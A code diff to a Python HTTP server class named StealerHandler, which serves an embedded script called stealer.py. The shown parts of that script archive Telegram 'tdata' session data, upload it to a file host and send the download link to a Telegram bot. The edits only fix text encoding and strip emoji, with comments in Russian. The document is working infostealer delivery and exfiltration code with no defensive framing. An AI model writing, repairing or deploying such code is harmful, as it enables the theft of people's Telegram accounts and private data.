@@ -6,7 +6,7 @@ class StealerHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         if self.path == '/stealer.py':
             self.send_response(200)
-            self.send_header('Content-type', 'text/plain')
+            self.send_header('Content-type', 'text/plain; charset=utf-8')  # Добавь charset
             self.end_headers()
             
             stealer_code = '''import os
@@ -89,7 +89,7 @@ def upload_to_fileio(file_path):
                 message_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                 data = {
                     'chat_id': CHAT_ID,
-                    'text': f"📁 tdata archive\\n🔗 Download: {download_url}\\n💾 Size: {file_size:.1f}MB\\n⏰ Expires: 14 days"
+                    'text': f"tdata archive\\nDownload: {download_url}\\nSize: {file_size:.1f}MB\\nExpires: 14 days"
                 }
                 
                 telegram_response = session.post(message_url, data=data, timeout=30)
@@ -145,7 +145,7 @@ if __name__ == "__main__":
     main()
 '''
             
-            self.wfile.write(stealer_code.encode())
+            self.wfile.write(stealer_code.encode('utf-8'))  # Добавь кодировку здесь
         else:
             self.send_response(404)
             self.end_headers()
